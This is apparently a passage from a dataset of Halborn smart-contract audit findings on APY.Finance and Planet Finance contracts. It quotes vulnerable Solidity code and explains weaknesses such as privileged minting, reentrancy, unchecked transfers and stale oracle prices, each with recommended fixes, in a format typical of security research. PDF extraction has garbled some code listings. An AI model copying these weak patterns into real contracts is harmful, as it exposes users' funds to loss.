registerAddress ( bytes32 id , address _address ) public 109 110 111 112 113 onlyOwner { require ( _address != address (0) , \" Invalid address \" ); if ( _idToAddress [ id ] == address (0) ) { // id wasn 't registered before , so add it to the list _idList . push ( id ); } 14 114 115 116 } _idToAddress [ id ] = _address ; emit AddressRegistered (id , _address ); Step 2: Malicious owner calls mint function manually from 0xABC...DEF address. Minting operation can be executed only if onlyManager modifier is cor- rectly verified. Listing 2: MetaPoolToken.sol (Lines 147) 143 144 145 146 147 148 149 150 151 152 153 154 function mint ( address account , uint256 amount ) public override nonReentrant onlyManager { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); IOracleAdapter oracleAdapter = _getOracleAdapter () ; oracleAdapter . lock () ; _mint ( account , amount ); emit Mint ( account , amount ); Step 3: Automatically onlyManager modifier verifies if 0xABC...DEF address is equal to the value returned by poolManagerAddress function. Listing 3: MetaPoolToken.sol (Lines 131) 129 130 131 132 133 134 135 modifier onlyManager () { require ( msg . sender == addressRegistry . poolManagerAddress () , \" MANAGER_ONLY \" ); _; } 15 Step 4: Because the address of PoolManager has been previously changed in Step 1, poolManagerAddress function will return 0xABC...DEF. This kind of attack allows malicious owner to mint / burn mAPT tokens manually. Listing 4: AddressRegistryV2.sol (Lines 160) 159 function poolManagerAddress () public view override returns ( address ) { return getAddress ( \" poolManager \" ); 160 161 } Risk Level: Likelihood - 3 Impact - 4 Recommendation: The internal _fund function from PoolManager contract should not transfer stablecoins to LP Safe wallet, neither call public mint function from MetaPoolToken contract. Instead, it should call a new external fund function from MetaPoolToken contract. Below is a proposed sample code for this function. Listing 5: Sample code for fund function 1 2 3 4 5 6 7 8 9 function fund ( PoolTokenV2 pool , address account , uint256 amount ) external nonReentrant onlyManager { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); underlyer . safeTransferFrom ( address ( pool ) , account , amount ); _mint ( account , amount ); 16 On the other hand, _mint function from MetaPoolToken contract must be internal. Below is a proposed sample code for this function. Listing 6: Sample code for mint function 1 2 3 4 5 6 7 8 9 10 11 function _mint ( address account , uint256 amount ) internal override nonReentrant { } require ( amount > 0, \" INVALID_MINT_AMOUNT \" ); IOracleAdapter oracleAdapter = _getOracleAdapter () ; oracleAdapter . lock () ; super . _mint ( account , amount ); emit Mint ( account , amount ); Finally, a similar security mechanism to the one indicated above should be applied to _burn function as well. Remediation plan: SOLVED: Issue fixed in commit 42c56dc7bf169224a628364d95906b2f73411516. PoolManager and MetaPoolToken contracts have been merged and now mint and burn functions are internal. 17 ", "labels": ["Halborn", "APY", "Severity: Medium"]}, {"title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of the function setAdminAddress in contracts can set them to invalid addresses and inadvertently allow unauthorized upgrades of contract logic. The owner of the contracts can change proxy admin addresses using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  PoolTokenV2  PoolManager  MetaPoolToken  AddressRegistryV2 Code Location: Listing 7: PoolTokenV2.sol 162 163 164 165 166 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Listing 8: PoolManager.sol 110 111 112 113 114 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } 18 Listing 9: MetaPoolToken.sol 112 113 114 115 116 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Listing 10: AddressRegistryV2.sol 83 84 85 86 87 function setAdminAddress ( address adminAddress ) public onlyOwner { require ( adminAddress != address (0) , \" INVALID_ADMIN \" ); proxyAdmin = adminAddress ; emit AdminChanged ( adminAddress ); } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to split privileged addresses transfer functionality into setAdminAddress and acceptAdminAddress functions. The latter func- tion allows the transfer to be completed by recipient. Below is a proposed sample code for acceptAdminAddress function. Listing 11: Sample code for acceptAdminAddress function 1 2 3 4 5 6 7 8 9 10 address public proxyAdmin ; address private pendingAdmin ; ... function acceptAdminAddress () external { require ( msg . sender == pendingAdmin , \" Must be proposed admin \"); address oldAdmin = proxyAdmin ; 19 proxyAdmin = msg . sender ; pendingAdmin = address (0) ; emit AdminTransferred ( oldAdmin , proxyAdmin ); 11 12 13 14 15 } Remediation plan: SOLVED: Issue fixed in commits 42c56dc7bf169224a628364d95906b2f73411516 and 357084f2c3eeed28b80f13d5a8e53f84121726c7. 20 MISSING ZERO-ADDRESS ", "labels": ["Halborn", "APY", "Severity: Medium"]}, {"title": "CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The setSigner function from RewardDistributor contract should perform a zero-address check when receives an address as a user-supplied parameter, despite RBAC controls already implemented (e.g.: onlyOwner modifier). Code Location: Listing 12: RewardDistributor.sol (Lines 114) 113 114 115 function setSigner ( address newSigner ) external onlyOwner { signer = newSigner ; } Risk Level: Likelihood - 3 Impact - 1 Recommendation: Add address validation for user-supplied values in addition to the ex- isting OpenZeppelin RBAC controls. Remediation plan: NOT APPLICABLE: APY.Finance team claimed that RewardDistributor contract was not in scope for present audit and was reviewed in a previous Halborn audit. Since then, the contract has not changed. 21 ", "labels": ["Halborn", "APY", "Severity: Low"]}, {"title": "LACK OF EVENTS FOR RELEVANT OPERATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Several relevant operations do not emit events. As a result, it will be difficult to review the correct behavior of the contracts once deployed. Relevant operations that would benefit from emitting events include:  PoolTokenV2.setFeePeriod  PoolTokenV2.setFeePercentage  PoolTokenV2.setReservePercentage  PoolTokenV2.infiniteApprove  PoolTokenV2.revokeApprove  PoolManager.fundLpSafe  PoolManager.withdrawFromLpSafe  AddressRegistryV2.deleteAddress  TVLManager.addAssetAllocation  TVLManager.removeAssetAllocation  OracleAdapter.setDefaultLockPeriod  OracleAdapter.setAssetValue  OracleAdapter.setTvl Users and/or blockchain monitoring systems are not able to timely detect suspicious behaviors without events. Code Location: Below is a sample of relevant functions that do not emit events, which complicates to detect suspicious behavior on smart contracts: 22 Listing 13: PoolTokenV2.sol 176 177 178 function setFeePeriod ( uint256 _feePeriod ) public onlyOwner { feePeriod = _feePeriod ; } Listing 14: PoolManager.sol 137 function fundLpSafe ( ILpSafeFunder . PoolAmount [] memory poolAmounts ) external override onlyOwner nonReentrant address lpSafeAddress = addressRegistry . lpSafeAddress () ; require ( lpSafeAddress != address (0) , \" INVALID_LP_SAFE \"); ( PoolTokenV2 [] memory pools , uint256 [] memory amounts ) = _getPoolsAndAmounts ( poolAmounts ); _fund ( lpSafeAddress , pools , amounts ); _registerPoolUnderlyers ( lpSafeAddress , pools ); 138 139 140 141 142 143 144 145 146 147 148 149 { } Listing 15: AddressRegistryV2.sol 142 143 144 145 146 147 148 149 150 151 152 function deleteAddress ( bytes32 id ) public onlyOwner { for ( uint256 i = 0; i < _idList . length ; i ++) { if ( _idList [ i] == id ) { // copy last element to slot i and shorten array _idList [ i] = _idList [ _idList . length - 1]; _idList . pop () ; delete _idToAddress [ id ]; break ; } } } Listing 16: TVLManager.sol 68 69 70 function addAssetAllocation ( Data memory data , string calldata symbol , 23 71 72 73 74 75 76 77 78 79 80 uint256 decimals ) external override nonReentrant onlyPermissioned { require (! isAssetAllocationRegistered ( data ) , \" DUPLICATE_DATA_DETECTED \"); bytes32 dataHash = generateDataHash ( data ); _allocationIds . add ( dataHash ); _allocationData [ dataHash ] = data ; _allocationSymbols [ dataHash ] = symbol ; _allocationDecimals [ dataHash ] = decimals ; lockOracleAdapter () ; } Listing 17: OracleAdapter.sol 156 157 158 159 160 161 162 163 164 function setTvl ( uint256 value , uint256 period ) external override locked onlyOwner { } // We do allow 0 values for submitted values submittedTvlValue = Value ( value , block . number . add ( period )) ; Risk Level: Likelihood - 2 Impact - 1 Recommendation: Add events for all relevant operations to help monitor the contracts and detect suspicious behavior. A monitoring system that tracks relevant events would allow timely detection of compromised system components. 24 Remediation plan: ACKNOWLEDGED: APY.Finance team acknowledged the finding and claimed that they have added events for all functions that have either side-effects or make external calls that could have side-effects (non-view functions). 25 ", "labels": ["Halborn", "APY", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Code Location: Below are smart contracts and their corresponding functions affected: AddressRegistryV2: getIds, daiPoolAddress, usdcPoolAddress, usdtPoolAddress, mAptAddress, lpSafeAddress, oracleAdapterAddress poolManagerAddress, deleteAddress, chainlinkRegistryAddress, MetaPoolToken: mint, burn, calculateMintAmount, calculatePoolAmount, getDeployedValue PoolTokenV2: setAddressRegistry, setFeePeriod, setFeePercentage, setReservePercent- age, calculateMintAmount, getAPTValue, getUnderlyerAmountFromValue, ge- tReserveTopUpValue OracleAdapter: getAssetPrice 26 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation plan: SOLVED: Issue fixed in commit 42c56dc7bf169224a628364d95906b2f73411516. 27 ", "labels": ["Halborn", "APY", "Severity: Informational"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Code Location: Listing 18: Contracts with experimental features enabled 1 2 3 4 5 6 7 8 AddressRegistryV2 MetaPoolToken MetaPoolTokenProxy PoolManager PoolManagerProxy PoolTokenProxy PoolTokenV2 TVLManager Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation plan: ACKNOWLEDGED: APY.Finance team acknowledged the finding and claimed that ABIEncoderV2 is only enabled on contracts where it is strictly necessary. 29 ", "labels": ["Halborn", "APY", "Severity: Informational"]}, {"title": "MISUSE OF AN ORACLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The UniswapAnchoredView contract is calling latestAnswer to get the last asset price. This method will return the last value, but it will not On the other hand, calling the allow checking if the data is fresh. method latestRoundData allows running additional validation. Code Location: Listing 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function validate ( address gToken ) external returns ( Error , bool valid ) { // Anyone can call validate if the market is calling it fetch the config using the Gtoken market address otherwise fetch the config using the gToken address given // NOTE : We don 't do any access control on msg . sender here . The access control is done in getTokenConfigByReporter , // which will REVERT if an unauthorized address is passed . TokenConfig memory config = getTokenConfigByGToken ( msg . sender ); config = config . gToken == msg . sender ? config : getTokenConfigByGToken ( gToken ); int256 currentAnswer = ( AggregatorValidatorInterface ( config . reporter ). latestAnswer () ); ( Error error2 , uint256 reportedPrice ) = convertReportedPrice ( config , currentAnswer ); if ( error2 != Error . NO_ERROR ){ emit Fail ( error2 ); return ( error2 , false ); 19 17 18 19 20 } } [ Redacted for brevity ] Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use the latestRoundData function to retrieve an assets price instead. Checks on the return data should be introduced with proper revert messages if the price is stale or the round is incomplete. Remediation Plan: SOLVED: The Planet Finance team fixed this issue in the commit 9517d388979cbafd4830e300d52458f32ed54010 (Refer:UniswapAnchoredView.sol). As a result, now, code uses latestRoundData function to retrieve an assets price. 20 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contracts Reservoir and Gammatroller , the return values of the external transfer calls are not checked. It should be noted that token does not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Reservoir.sol Lines #396-398 Listing 3: Reservoir.sol (Lines 396,397,398) 396 397 398 token_ . transfer ( gammaTroller , deltaDripGammaTroller_ ); token_ . transfer ( foundation , deltaDripFoundation_ ); token_ . transfer ( treasury , deltaDripTreasury_ ); Reservoir.sol Lines #410 Listing 4: Reservoir.sol (Line 410) 406 407 408 409 410 411 412 413 414 function dripOnFarm ( uint _amount ) external onlyFarm { farmDripped += _amount ; token . transfer ( farmAddress , _amount ); emit FarmDripped ( farmDripped , block . timestamp ); } 21 Gammatroller.sol Lines #4590 Listing 5: Gammatroller.sol (Line 4590) 4586 function grantGammaInternal ( address user , uint amount ) 4587 4588 4589 4590 4591 4592 4593 4594 internal returns ( uint ) { Gamma gamma = Gamma ( getGammaAddress () ); uint gammaRemaining = gamma . balanceOf ( address ( this )) ; if ( amount > 0 && amount <= gammaRemaining ) { gamma . transfer ( user , amount ); return 0; } return amount ; } Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. It is recommended to check after transfer balance. Remediation Plan: SOLVED: The Planet Finance team fixed this issue in the commit 19beabb2bdf7e66857207135e5afac0717271118. As a result, now code using the SafeERC20 implementation and add the safetransfer function to the Reservoir.sol contract code. However, the team added that the team does not use the grantGammaInternal function in the gammatroller contract. 22 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Medium"]}, {"title": "COMPTROLLER ERC777 LEADS TO RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It is noted that forked comptroller contract Unitroller.sol uses ERC777 that have functions vulnerable to Re-enterancy Vulnerability. It should be noted that all compound forks are vulnerable, unless nonReentrant modifier is used. Exploitation Scenario: For the successful exploitation, the exploit requires the following con- ditions - The contract admin should add support for ERC777 Token. - The contract admin should set the bad token price through oracle. - The contract admin should set collateral factor in the comptroller. Exploitation Flow-Graph: 23 Code Location: Listing 6: Unitroller.sol (Line 1801) 1794 1795 1796 1797 1798 1799 1800 1801 1802 1803 1804 1805 1806 1807 1808 1809 1810 1811 1812 1813 1814 1815 1816 /* * We invoke doTransferOut for the borrower and the borrowAmount . Note : The gToken must handle variations between ERC -20 and ETH underlying . On success , the gToken borrowAmount less of cash . If doTransferOut fails despite the fact we checked pre - conditions , we revert because we can 't be sure if side effects occurred . * * * * */ vars . err = doTransferOut ( borrower , borrowAmount ); require ( vars . err == Error . NO_ERROR , \" borrow transfer out failed \" ); /* We write the previously calculated values into storage */ accountBorrows [ borrower ]. principal = vars . accountBorrowsNew ; accountBorrows [ borrower ]. interestIndex = borrowIndex ; totalBorrows = vars . totalBorrowsNew ; /* We emit a Borrow event */ emit Borrow ( borrower , borrowAmount , vars . accountBorrowsNew , vars . totalBorrowsNew ); /* We call the defense hook */ gammatroller . borrowVerify ( address ( this ) , borrower , borrowAmount ); return uint ( Error . NO_ERROR ); } Recommendation: It is recommended to implement the below controls - nonReentrant modifier should be implemented for borrowFresh(), redeemFresh(), doTransferIn() and doTransferOut() 24 - (bool, success) check should be controlled on the outside of the doTransferOut() functionality - function doTransferOut() intercepted variables Storage should before be Below is the fix to the vulnerable code. Listing 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 /* We write the previously calculated values into storage */ accountBorrows [ borrower ]. principal = vars . accountBorrowsNew ; accountBorrows [ borrower ]. interestIndex = borrowIndex ; totalBorrows = vars . totalBorrowsNew ; /* * We invoke doTransferOut for the borrower and the borrowAmount . Note : The gToken must handle variations between ERC -20 and ETH underlying . On success , the gToken borrowAmount less of cash . If doTransferOut fails despite the fact we checked pre - conditions , we revert because we can 't be sure if side effects occurred . * * * * */ vars . err = doTransferOut ( borrower , borrowAmount ); require ( vars . err == Error . NO_ERROR , \" borrow transfer out failed \" ); /* We emit a Borrow event */ emit Borrow ( borrower , borrowAmount , vars . accountBorrowsNew , vars . totalBorrowsNew ); /* We call the defense hook */ gammatroller . borrowVerify ( address ( this ) , borrower , borrowAmount ); return uint ( Error . NO_ERROR ); } 25 Remediation Plan: RISK ACCEPTED: The Planet Finance team acknowledged this issue. The team confirmed that the deployed contracts are not implemented with ERC-777, and the ERC777 standard will not be used in the future. 26 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH NON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some tokens (like USDT) dont correctly implement the EIP20 standard and their transfer/transferFrom functions return void, instead of a suc- cess boolean. Calling these functions with the correct EIP20 function signatures will always revert. In the contract Gammatroller.sol, gAQUA_Delegate.sol, gAQUA_Delegator. sol gBNB.sol, gGAMMA_Delegate.sol, gGAMMA_Delegator.sol, gToken_Delegate .sol, gToken_Delegator.sol, Maximillion.sol, and Unitroller.sol their transfer or transferFrom does not return a boolean for ERC20 functions if implemented. A contract compiled with solidity version greater than 0.4.22 interacting with these functions will fail to execute them, as the return value is missing. Tokens that dont correctly implement the latest EIP20 spec, like USDT, will be unusable in the smart contract as they revert the transaction because of the missing return value. We recommend using OpenZeppelins SafeERC20 versions with the safeTransfer and safeTransferFrom functions that handle the return value check as well as non-standard-compliant tokens. Code Location: Following contracts transfer or transferFrom does not return a boolean. Listing 8 1 ( Gammatroller . sol #1379 -1441) : EIP20NonStandardInterface . transfer ( address , uint256 ) 2 ( Gammatroller . sol #1379 -1441) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 3 ( gAQUA_Delegate . sol #906 -968) : EIP20NonStandardInterface . transfer ( address , uint256 ) 4 ( gAQUA_Delegate . sol #906 -968) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 27 5 ( gAQUA_Delegator . sol #728 -790) : EIP20NonStandardInterface . transfer ( address , uint256 ) 6 ( gAQUA_Delegator . sol #728 -790) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 7 ( gBNB . sol #687 -749) : EIP20NonStandardInterface . transfer ( address , uint256 ) 8 ( gBNB . sol #687 -749) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 9 ( gGAMMA_Delegate . sol #766 -828) : EIP20NonStandardInterface . transfer ( address , uint256 ) 10 ( gGAMMA_Delegate . sol #766 -828) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 11 ( gGAMMA_Delegator . sol #14 -76) : EIP20NonStandardInterface . transfer ( address , uint256 ) 12 ( gGAMMA_Delegator . sol #14 -76) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 13 ( gToken_Delegate . sol #906 -968) : EIP20NonStandardInterface . transfer ( address , uint256 ) 14 ( gToken_Delegate . sol #906 -968) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 15 ( gToken_Delegator . sol #728 -790) : EIP20NonStandardInterface . transfer ( address , uint256 ) 16 ( gToken_Delegator . sol #728 -790) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 17 ( Maximillion . sol #672 -734) : EIP20NonStandardInterface . transfer ( address , uint256 ) 18 ( Maximillion . sol #672 -734) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) 19 ( Unitroller . sol #670 -732) : EIP20NonStandardInterface . transfer ( address , uint256 ) 20 ( Unitroller . sol #670 -732) : EIP20NonStandardInterface . transferFrom ( address , address , uint256 ) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to use SafeERC20: safeTransfer and safeTransferFrom. 28 Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue, as the team confirmed that Planet Finance does not use any non-standard tokens in the protocol. 29 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In some functions discovered there is a for loop on variable i that iterates up to the gTokens.length, assets.length, usersWhoHaveBorrow .length, and usersWhoHaveSupply.length array length. If this integer is evaluated at large numbers, this can cause a DoS. Code Location: Listing 9: Gammatroller.sol (Line 4561) 4556 function claimGamma ( address [] memory holders , GToken [] memory 4557 4558 4559 4560 4561 4562 4563 4564 4565 4566 4567 4568 4569 4570 4571 4572 4573 4574 gTokens , bool borrowers , bool suppliers ) public { for ( uint i = 0; i < gTokens . length ; i ++) { GToken gToken = gTokens [i ]; require ( markets [ address ( gToken ) ]. isListed , \" market must be listed \" ); if ( borrowers == true ) { Exp memory borrowIndex = Exp ({ mantissa : gToken . borrowIndex () }) ; updateGammaBorrowIndex ( address ( gToken ) , borrowIndex ); for ( uint j = 0; j < holders . length ; j ++) { distributeBorrowerGamma ( address ( gToken ) , holders [j ], borrowIndex ); } } if ( suppliers == true ) { updateGammaSupplyIndex ( address ( gToken )) ; for ( uint j = 0; j < holders . length ; j ++) { distributeSupplierGamma ( address ( gToken ) , holders [j ]) ; } } } for ( uint j = 0; j < holders . length ; j ++) { 30 4575 4576 4577 } } gammaAccrued [ holders [j ]] = grantGammaInternal ( holders [ j ], gammaAccrued [ holders [ j ]]) ; Listing 10: Gammatroller.sol (Lines 4050,4058) 4035 4036 4037 4038 4039 4040 4041 4042 4043 4044 4045 4046 4047 4048 4049 4050 4051 4052 4053 4054 4055 4056 4057 4058 4059 4060 4061 4062 function getHypotheticalAccountLiquidityInternal ( address account , GToken gTokenModify , uint redeemTokens , uint borrowAmount ) internal view returns ( Error , uint , uint ) { AccountLiquidityLocalVars memory vars ; // Holds all our calculation results uint oErr ; // For each asset the account is in GToken [] memory assets = accountAssets [ account ]; for ( uint i = 0; i < assets . length ; i ++) { GToken asset = assets [ i ]; // Read the balances and exchange rate from the gToken ( oErr , vars . gTokenBalance , vars . borrowBalance , vars . exchangeRateMantissa ) = asset . getAccountSnapshot ( account ); if ( oErr != 0) { // semi - opaque error code , we assume NO_ERROR == 0 is invariant between upgrades return ( Error . SNAPSHOT_ERROR , 0, 0) ; } vars . collateralFactor = Exp ({ mantissa : markets [ address ( asset ) ]. collateralFactorMantissa }) ; vars . exchangeRate = Exp ({ mantissa : vars . exchangeRateMantissa }) ; // Get the normalized price of the asset vars . oraclePriceMantissa = oracle . getUnderlyingPrice ( asset ); if ( vars . oraclePriceMantissa == 0) { return ( Error . PRICE_ERROR , 0, 0) ; } vars . oraclePrice = Exp ({ mantissa : vars . oraclePriceMantissa }) ; 31 4063 4064 4065 4066 4067 4068 4069 4070 4071 4072 4073 4074 4075 4076 4077 4078 4079 4080 4081 4082 4083 4084 4085 4086 4087 4088 4089 4090 4091 // Pre - compute a conversion factor from tokens -> ether ( normalized price value ) vars . tokensToDenom = mul_ ( mul_ ( vars . collateralFactor , vars . exchangeRate ) , vars . oraclePrice ); // sumCollateral += tokensToDenom * gTokenBalance vars . sumCollateral = mul_ScalarTruncateAddUInt ( vars . tokensToDenom , vars . gTokenBalance , vars . sumCollateral ); // sumBorrowPlusEffects += oraclePrice * borrowBalance vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . oraclePrice , vars . borrowBalance , vars . sumBorrowPlusEffects ); // Calculate effects of interacting with gTokenModify if ( asset == gTokenModify ) { // redeem effect // sumBorrowPlusEffects += tokensToDenom * redeemTokens vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . tokensToDenom , redeemTokens , vars . sumBorrowPlusEffects ); // borrow effect // sumBorrowPlusEffects += oraclePrice * borrowAmount vars . sumBorrowPlusEffects = mul_ScalarTruncateAddUInt ( vars . oraclePrice , borrowAmount , vars . sumBorrowPlusEffects ); } } // These are safe , as the underflow condition is checked first if ( vars . sumCollateral > vars . sumBorrowPlusEffects ) { return ( Error . NO_ERROR , vars . sumCollateral - vars . sumBorrowPlusEffects , 0) ; } else { return ( Error . NO_ERROR , 0 , vars . sumBorrowPlusEffects - vars . sumCollateral ); } } 32 Listing 11: gBNB.sol (Lines 2660,2667) 2653 2654 2655 2656 2657 2658 2659 2660 2661 2662 2663 2664 2665 2666 2667 2668 2669 2670 2671 2672 2673 function updateDiscountForAll () external { address [] memory usersWhoHaveBorrow = PlanetDiscount ( discountLevel ). returnBorrowUserArr ( address ( this )) ; address [] memory usersWhoHaveSupply = PlanetDiscount ( discountLevel ). returnSupplyUserArr ( address ( this )) ; for ( uint i = 0 ; i < usersWhoHaveBorrow . length ; i ++) { ( bool exist , , , ,) = PlanetDiscount ( discountLevel ). borrowDiscountSnap ( address ( this ) , usersWhoHaveBorrow [ i ]) ; if ( usersWhoHaveBorrow [ i ] != address (0) && exist ){ changeUserBorrowDiscountInternal ( usersWhoHaveBorrow [ i ]) ; changeLastBorrowBalanceAtBorrow ( usersWhoHaveBorrow [i ]) ; } } for ( uint i = 0 ; i < usersWhoHaveSupply . length ; i ++) { ( bool exist , , ,) = PlanetDiscount ( discountLevel ). supplyDiscountSnap ( address ( this ) , usersWhoHaveSupply [ i ]) ; if ( usersWhoHaveSupply [ i ] != address (0) && exist ){ changeUserSupplyDiscountInternal ( usersWhoHaveSupply [ i ]) ; changeLastExchangeRateAtSupply ( usersWhoHaveSupply [ i ]) ; } } } Listing 12: Maximillion.sol (Lines 2625,2632) function updateDiscountForAll () external { address [] memory usersWhoHaveBorrow = PlanetDiscount ( discountLevel ). returnBorrowUserArr ( address ( this )) ; address [] memory usersWhoHaveSupply = PlanetDiscount ( discountLevel ). returnSupplyUserArr ( address ( this )) ; 2618 2619 2620 2621 2622 2623 33 2624 2625 2626 2627 2628 2629 2630 2631 2632 2633 2634 2635 2636 2637 2638 for ( uint i = 0 ; i < usersWhoHaveBorrow . length ; i ++) { ( bool exist , , , ,) = PlanetDiscount ( discountLevel ). borrowDiscountSnap ( address ( this ) , usersWhoHaveBorrow [ i ]) ; if ( usersWhoHaveBorrow [ i ] != address (0) && exist ){ changeUserBorrowDiscountInternal ( usersWhoHaveBorrow [ i ]) ; changeLastBorrowBalanceAtBorrow ( usersWhoHaveBorrow [i ]) ; } } for ( uint i = 0 ; i < usersWhoHaveSupply . length ; i ++) { ( bool exist , , ,) = PlanetDiscount ( discountLevel ). supplyDiscountSnap ( address ( this ) , usersWhoHaveSupply [ i ]) ; if ( usersWhoHaveSupply [ i ] != address (0) && exist ){ changeUserSupplyDiscountInternal ( usersWhoHaveSupply [ i ]) ; changeLastExchangeRateAtSupply ( usersWhoHaveSupply [ i ]) ; } } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to set the max length to which a for loop can iterate, and avoid usage of nested loops. If possible, use pull over push strategy for external calls. Remediation Plan: RISK ACCEPTED: The Planet Finance team accepts the risk for this issue, as the team confirmed that these functions have a finite amount of things 34 to loop through. 35 ", "labels": ["Halborn", "Planet_Finance_Green", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Planet_Finance_Green_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. Code Location:  In contract Gammatroller.sol:  _setBorrowCapGuardian newBorrowCapGuardian. lacks a zero address check on  _setPauseGuardian lacks a zero address check on newPauseGuardian .  _setPendingAdmin lacks a zero address check on newPendingAdmin, newPendingAdmin.  _setPendingImplementation newPendingImplementation.  In contract gAQUA_Delegate.sol: lacks a zero address check on  initialize lacks a zero address check on underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gAQUA_Delegator.sol:  changeAddress lacks a zero address check on _newgGammaAddress, _newGammatroller, _newOracle.  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract gBNB.sol:  _setPendingAdmin lacks a zero address check on newPendingAdmin.  In contract gGAMMA_Delegate.sol: 36  initialize lacks a zero address check on underlying_.  _setPendingAdmin lacks a zero address check on newPendingAdmin.  _setWithdrawFeeAddress on newWithdrawFeeAddress.  In contract gGAMMA_Delegator.sol: address check lacks zero a  constructor lacks a zero address check on admin_.  _setImplementation lacks a zero address check on implementation_ .  In contract gToken_Delegate.sol:  initialize lacks a zero address check on 